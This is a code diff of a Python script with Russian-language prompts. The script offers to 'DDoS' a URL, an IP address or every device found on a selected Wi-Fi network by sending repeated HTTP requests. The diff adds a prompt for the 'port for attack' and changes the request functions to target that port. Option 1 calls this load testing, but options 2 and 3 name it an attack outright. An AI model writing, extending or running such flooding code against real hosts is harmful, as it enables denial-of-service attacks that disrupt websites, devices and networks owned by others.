@@ -20,9 +20,11 @@ chose = input("Выберите тип DDoS или сканирование Wi-F
 
 if chose == "1":
     url = input("Введите URL вашего сайта для нагрузочного тестирования: ")
+    port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
     number_of_requests = int(input("Введите количество запросов: "))
 elif chose == "2":
     ip = input("Введите IP для DDoS атаки: ")
+    port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
     number_of_requests = int(input("Введите количество запросов: "))
 elif chose == "3":
     number_of_requests = int(input("Введите количество запросов для DDoS атаки на выбранную сеть: "))
@@ -30,14 +32,14 @@ elif chose == "3":
 # Функция для отправки запроса на URL (если выбран сайт)
 def send_request_to_url():
     try:
-        response = requests.get(url)
+        response = requests.get(f"{url}:{port}")  # Используем указанный порт
         return response.status_code, response.text
     except requests.exceptions.RequestException as e:
         return None, str(e)
 
 def send_request_to_ip(target_ip):
     try:
-        response = requests.get(f"http://{target_ip}", timeout=5)  # Добавлено время ожидания
+        response = requests.get(f"http://{target_ip}:{port}", timeout=5)  # Используем указанный порт
         return response.status_code, response.text
     except requests.exceptions.Timeout:
         return None, f"Ошибка: Превышено время ожидания при подключении к {target_ip}."
@@ -96,7 +98,7 @@ def ddos_wifi_network(network):
     # Находим устройства в сети
     ip_addresses = find_devices_in_network(network.bssid)
 
-    print("Найденные устройства:")
+    print("Найденные устройства: ")
     
     if not ip_addresses:  # Проверяем, есть ли устройства
         print("Не найдено ни одного устройства в сети.")
